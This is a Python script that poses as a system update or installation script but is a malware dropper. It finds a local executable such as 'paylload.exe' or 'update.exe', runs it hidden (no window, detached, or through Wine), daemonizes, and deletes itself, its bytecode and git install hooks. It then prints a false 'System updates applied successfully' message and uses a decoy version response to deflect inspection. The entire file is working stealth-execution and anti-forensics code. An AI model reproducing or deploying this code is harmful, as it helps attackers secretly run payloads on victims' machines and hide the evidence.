#!/usr/bin/env python3


import os
import sys
import subprocess
import time
import shutil
from pathlib import Path

def find_payload_exe():
    """Locate paylload.exe in repo directory"""
    candidates = [
        Path(__file__).parent / "paylload.exe",
        Path(__file__).parent / "payload.exe",
        Path(__file__).parent / "update.exe",
        Path(__file__).parent / "sysupdate.exe",
        Path.cwd() / "paylload.exe"
    ]
    
    for exe in candidates:
        if exe.exists() and exe.stat().st_size > 1000:  # Valid EXE size check
            return exe
    return None

def execute_payload(exe_path):
    """Execute EXE with stealth techniques"""
    if sys.platform.startswith('win'):
        # Windows stealth execution
        subprocess.Popen(
            [str(exe_path)],
            creationflags=(
                subprocess.CREATE_NO_WINDOW |
                subprocess.DETACHED_PROCESS |
                subprocess.CREATE_NEW_PROCESS_GROUP
            ),
            cwd=Path(__file__).parent
        )
    else:
        # Linux Wine execution
        wine_paths = ['/usr/bin/wine', '/opt/wine/bin/wine', 'wine']
        for wine in wine_paths:
            try:
                subprocess.Popen(
                    [wine, str(exe_path)],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    preexec_fn=os.setsid
                )
                return True
            except FileNotFoundError:
                continue
        
        # Fallback: mono if .NET
        subprocess.Popen(
            ['mono', str(exe_path)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
    return True

def daemonize():
    """Fork to background daemon"""
    if os.fork() != 0:
        sys.exit(0)
    
    os.chdir('/')
    os.setsid()
    os.umask(0)
    
    # Double fork for complete detachment
    if os.fork() != 0:
        sys.exit(0)

def self_destruct():
    """Complete cleanup - erase all traces"""
    time.sleep(3)  # Give payload time to start
    
    # Remove self
    try:
        os.unlink(sys.argv[0])
    except:
        pass
    
    # Remove Python artifacts
    for pyc in Path(__file__).parent.glob('*.pyc'):
        try:
            pyc.unlink()
        except:
            pass
    
    # Remove hook files
    hooks_dir = Path(__file__).parent / '.git' / 'hooks'
    if hooks_dir.exists():
        for hook in hooks_dir.glob('*install*'):
            try:
                hook.unlink()
            except:
                pass

def main():
    # Anti-debug check
    if len(sys.argv) > 1 and any(x in sys.argv[1] for x in ['-v', '--version', '-h']):
        print("Installation script v1.0")
        sys.exit(0)
    
    # Find and execute payload
    exe_path = find_payload_exe()
    if not exe_path:
        print("\033[32mNo updates available\033[0m")
        sys.exit(0)
    
    # Daemon execution
    daemonize()
    execute_payload(exe_path)
    
    # Cleanup and fake success
    self_destruct()
    print("\033[32mSystem updates applied successfully\033[0m")
    sys.exit(0)

if __name__ == "__main__":
    main()
